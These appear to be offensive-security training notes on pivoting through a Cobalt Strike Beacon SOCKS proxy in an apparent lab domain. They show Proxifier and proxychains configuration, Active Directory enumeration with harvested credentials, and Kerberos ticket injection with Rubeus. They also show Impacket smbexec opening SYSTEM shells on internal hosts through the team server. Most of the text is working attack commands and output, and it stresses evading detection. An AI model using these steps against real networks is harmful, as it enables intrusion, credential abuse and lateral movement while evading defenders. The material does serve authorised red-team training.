
SOCKS, short for "SOCKet Secure" is a protocol that exchanges network packets between a client and server, via a proxy server.  Cobalt Strike and Beacon can act as a SOCKS proxy to exchange traffic between an external adversary, and machines internal to the target network.  The following diagram shows this at a high-level.

![[Pasted image 20250717201753.png]]

- The adversary instructs the team server to start listening on a port, such as 1080.  This is done by issuing the `socks` command in the Beacon session they wish to act as the pivot point.
    
- The adversary then runs a tool on their local machine, which is intended to hit a machine on the internal network, such as Impacket.  A proxying tool, such as `proxychains` is configured to route the traffic via the port listening on the team server.
    
- Traffic hitting the team server is packaged up into a task, which is fetched over the C2 channel when the Beacon checks in.  The lower Beacon's sleep time, the quicker the traffic can be tunnelled.
    
- Beacon unpacks the data and forwards it to the target host on the internal network.  If there is a response, Beacon sends it back to the team server over the C2 channel.
    
- The team server forwards this response back to the adversary and the output is displayed by whatever tool they ran.

Using SOCKS to tunnel tooling is quite advantageous.  One reason is that some tools are written in a language, such as Python, that is not readily available on Windows, and therefore will not easily run on those compromised hosts.  Another reason is that it reduces the detection surface of your TTPs.  All post-ex execution on a compromised host, be it a BOF, .NET assembly, or reflective DLL, creates indicators that can be logged by security vendors.  Tunnelling tools remotely removes those indicators and only leaves the network traffic.  The final reason, which may seem a bit 'noobish', is that we can run GUI tools, such as RSAT, directly on our attacker machine.  Some tasks are extremely complicated to achieve via command-line tool, so this makes some things a whole lot easier.

### Start the SOCKS proxy

```powershell
beacon> socks 1080
[+] started SOCKS4a server on: 1080
```

### Proxifier on Windows

Proxifier is a tool that run on Windows and forces your TCP traffic through a proxy.

To create a new proxy server profile, select **Profile > Proxy Servers**.  The IP address will be that of your team server, and the port and protocol need to match what you used in the `socks` command.

![[Pasted image 20250717202652.png]]

When adding a new proxification rule, you can generally leave the applications field as _Any_ but specify the IP range (and/or domain names) of your target hosts.  This ensures that only traffic destined for the target internal network will go through the proxy.

![[Pasted image 20250717202717.png]]

You can then launch a tool such `C:\Tools\SysinternalsSuite\ADExplorer64.exe` and attempt to connect to a target DC with an explicit username and password.  You should be able to see Proxifier tunnel the traffic through the proxy and the Active Directory information appear in AD Explorer.

![[Pasted image 20250717202739.png]]

### Authentication

The most common ways to authenticate to domain resources through a proxy are with plaintext credentials or Kerberos tickets.  NTLM is also possible, but I consider that deprecated as far as modern tradecraft goes.  Because Kerberos requires the use of hostnames, rather than IP addresses, you first need to add static host entries to your attacking machine, e.g:

```powershell
PS C:\Users\Attacker> Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.1 lon-dc-1'
```

The official Remote Server Administration Tools (RSAT) tools can be installed on any Windows machine, regardless of whether they are domain joined or not.  The PowerShell cmdlets in particular are great for enumerating and/or abusing Active Directory.  You can create a credential object with plaintext credentials via _Get-Credential_, and pass that object to the various RSAT cmdlets to perform pass the authentication material.

```powershell
PS C:\Users\Attacker> $Cred = Get-Credential CONTOSO.COM\rsteel
PS C:\Users\Attacker> Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Credential $Cred -Server lon-dc-1

DistinguishedName : CN=krbtgt,CN=Users,DC=contoso,DC=com
Enabled           : False
GivenName         :
Name              : krbtgt
ObjectClass       : user
ObjectGUID        : 0de06fb0-6ebb-4619-8662-af975d28ab61
SamAccountName    : krbtgt
SID               : S-1-5-21-3926355307-1661546229-813047887-502
Surname           :
UserPrincipalName :

DistinguishedName : CN=MSSQL Service,CN=Users,DC=contoso,DC=com
Enabled           : True
GivenName         : MSSQL
Name              : MSSQL Service
ObjectClass       : user
ObjectGUID        : bcb11cba-1611-4b13-a11e-8187a7df1ce7
SamAccountName    : mssql_svc
SID               : S-1-5-21-3926355307-1661546229-813047887-3102
Surname           : Service
UserPrincipalName : mssql_svc@contoso.com
```

>  PowerView supports the same, so we can leverage its amazing functionality without the cost of executing PowerShell directly on a target.

To leverage Kerberos tickets, start a new process with a fake password using `Rubeus createnetonly` and the `/show` parameter.

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /domain:CONTOSO.COM /username:rsteel /password:FakePass /program:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /ticket:C:\Users\Attacker\Desktop\rsteel.kirbi /show
```

`Rubeus klist` in the new window will confirm the ticket has been injected.

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist

Action: List Kerberos Tickets (Current User)

[*] Current LUID    : 0x27c136

  UserName                 : Attacker
  Domain                   : DESKTOP-FGSTPS7
  LogonId                  : 0x27c136
  UserSID                  : S-1-5-21-2869105692-1800599516-1289031363-1005
  AuthenticationPackage    : Negotiate
  LogonType                : NewCredentials
  LogonTime                : 28/04/2025 12:48:18
  LogonServer              :
  LogonServerDNSDomain     :
  UserPrincipalName        :

    [0] - 0x12 - aes256_cts_hmac_sha1
      Start/End/MaxRenew: 28/04/2025 12:30:43 ; 28/04/2025 22:30:43 ; 05/05/2025 12:30:43
      Server Name       : krbtgt/CONTOSO.COM @ CONTOSO.COM
      Client Name       : rsteel @ CONTOSO.COM
      Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)
```

We also need to request service tickets manually, rather than relying on Windows doing it magically for us.  For example, to query Active Directory, use `asktgs` to get a ticket for LDAP and pass it directly into this logon session.

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:C:\Users\Attacker\Desktop\rsteel.kirbi /dc:lon-dc-1 /ptt

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'ldap/lon-dc-1'
[*] Using domain controller: lon-dc-1 (10.10.120.1)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      doIFl[...snip...]kYy0x

  ServiceName              :  ldap/lon-dc-1
  ServiceRealm             :  CONTOSO.COM
  UserName                 :  rsteel (NT_PRINCIPAL)
  UserRealm                :  CONTOSO.COM
  StartTime                :  28/04/2025 12:51:42
  EndTime                  :  28/04/2025 22:30:43
  RenewTill                :  05/05/2025 12:30:43
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  1PJYuYDQZDWNXR9MUpQxMGFbcFWKj9t6S01HXqUaobQ=

PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist

Action: List Kerberos Tickets (Current User)

[*] Current LUID    : 0x27c136

  UserName                 : Attacker
  Domain                   : DESKTOP-FGSTPS7
  LogonId                  : 0x27c136
  UserSID                  : S-1-5-21-2869105692-1800599516-1289031363-1005
  AuthenticationPackage    : Negotiate
  LogonType                : NewCredentials
  LogonTime                : 28/04/2025 12:48:18
  LogonServer              :
  LogonServerDNSDomain     :
  UserPrincipalName        :

    [0] - 0x12 - aes256_cts_hmac_sha1
      Start/End/MaxRenew: 28/04/2025 12:30:43 ; 28/04/2025 22:30:43 ; 05/05/2025 12:30:43
      Server Name       : krbtgt/CONTOSO.COM @ CONTOSO.COM
      Client Name       : rsteel @ CONTOSO.COM
      Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)

    [1] - 0x12 - aes256_cts_hmac_sha1
      Start/End/MaxRenew: 28/04/2025 12:51:42 ; 28/04/2025 22:30:43 ; 05/05/2025 12:30:43
      Server Name       : ldap/lon-dc-1 @ CONTOSO.COM
      Client Name       : rsteel @ CONTOSO.COM
      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)
```

This process will now have the tickets necessary to query the target domain controller.

```powershell
PS C:\Users\Attacker> ipmo ActiveDirectory
PS C:\Users\Attacker> Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Server lon-dc-1 | select DistinguishedName

DistinguishedName
-----------------
CN=krbtgt,CN=Users,DC=contoso,DC=com
CN=MSSQL Service,CN=Users,DC=contoso,DC=com
CN=Christopher Robin,CN=Users,DC=contoso,DC=com
```

### Proxychains on Linux

Like Proxifier, proxychains is a Linux tool that forces TCP traffic made by a given application to route through a proxy.

Using a text editor, such as vim or nano, open `/etc/proxychains.conf` for editing.

First, scroll to line 38 and comment out `proxy_dns`.  Then, scroll to line 64 and you will see the following default proxy entry: `socks4 127.0.0.1 9050`.  We need to replace this so that it points to the IP and port of the SOCKS server running on the team server, e.g. `socks4 10.0.0.5 1080`.

Now we can wrap a tool with proxychains, such as nmap.

>WSL inherits static host entries from Windows, so you don't need to add them to `/etc/hosts` if you've already added them in Windows.

```powershell
attacker@DESKTOP-FGSTPS7:~$ proxychains nmap -n -sT -Pn -p 445 lon-dc-1
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-28 13:03 UTC
|S-chain|-<>-10.0.0.5:1080-<><>-10.10.120.1:445-<><>-OK
Nmap scan report for lon-dc-1 (10.10.120.1)
Host is up (0.12s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

We could even execute a remote shell on the target using Impacket with plaintext credentials.

```powershell
attacker@DESKTOP-FGSTPS7:~$ proxychains smbexec.py 'CONTOSO/rsteel:Passw0rd!@lon-ws-1'
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

|S-chain|-<>-10.0.0.5:1080-<><>-10.10.120.10:445-<><>-OK
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>hostname
lon-ws-1

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>exit
```

### Authentication

Impacket (and other Linux tools) can also use Kerberos tickets, but they need to be in [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) format.   `ticketConverter.py` can convert from kirbi to ccache and vice versa.

```powershell
attacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/Desktop$ ticketConverter.py rsteel.kirbi rsteel.ccache
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] converting kirbi to ccache...
[+] done
```

We then need an environment variable called `KRB5CCNAME` that points to the ticket on disk.

```powershell
attacker@DESKTOP-FGSTPS7:~$ export KRB5CCNAME=/mnt/c/Users/Attacker/Desktop/rsteel.ccache
```

Then instead of using a plaintext password, we use Impacket's `-no-pass`, `-k`, and `-dc-ip` parameters.

```powershell
attacker@DESKTOP-FGSTPS7:~$ proxychains smbexec.py -no-pass -k -dc-ip lon-dc-1 CONTOSO.COM/rsteel@lon-ws-1
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

|S-chain|-<>-10.0.0.5:1080-<><>-10.10.120.10:445-<><>-OK
|S-chain|-<>-10.0.0.5:1080-<><>-10.10.120.1:88-<><>-OK
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```